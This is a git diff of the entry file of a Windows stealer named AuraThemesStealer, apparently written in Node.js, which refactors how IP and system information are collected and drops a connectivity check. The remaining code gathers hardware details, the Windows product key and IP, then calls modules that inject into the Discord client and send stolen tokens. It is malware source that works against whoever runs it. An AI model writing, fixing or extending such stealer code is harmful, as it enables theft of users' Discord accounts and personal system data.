@@ -1,10 +1,9 @@
-const axios = require("axios");
 const process = require("process");
 const getconfig = require("./config/config")();
 
 switch (process.platform) {
     case "win32":
-        const { getPublicIp, getInfo } = require("./modules/core/core");
+        const { getInfo } = require("./modules/core/core");
         const { discordInjected } = require("./modules/dinjection/injection");
         const { sendTokens } = require("./modules/findtoken/send");
         const { debuggerx } = require("./modules/debugger/debuggerx");
@@ -16,9 +15,9 @@ switch (process.platform) {
             }
             async initialize() {
                 try {
-                    const { disk, ram, uid, cpucount, os, cpu, gpu, windowskey, windowsversion } = await getInfo();
-                    const { ip, hostname, city, region, country, loc, org, postal, timezone } = await getPublicIp();
-                    await debuggerx(getconfig.debugger, ip, disk, ram, uid, cpucount, os, cpu, gpu, windowskey, windowsversion);
+                    const { disk, ram, uid, cpucount, ip, os, cpu, gpu, windowskey, windowsversion } = await getInfo();
+                    
+                    await debuggerx(getconfig.debugger, disk, ram, uid, cpucount, ip, os, cpu, gpu, windowskey, windowsversion);
                     await discordInjected(getconfig.injection);
                     await sendTokens();
 
@@ -29,9 +28,7 @@ switch (process.platform) {
             }
         }
 
-        axios.get("https://discord.com")
-            .then(() => new AuraThemesStealer())
-            .catch(() => new AuraThemesStealer());
+        new AuraThemesStealer()
 
         break;
     default:
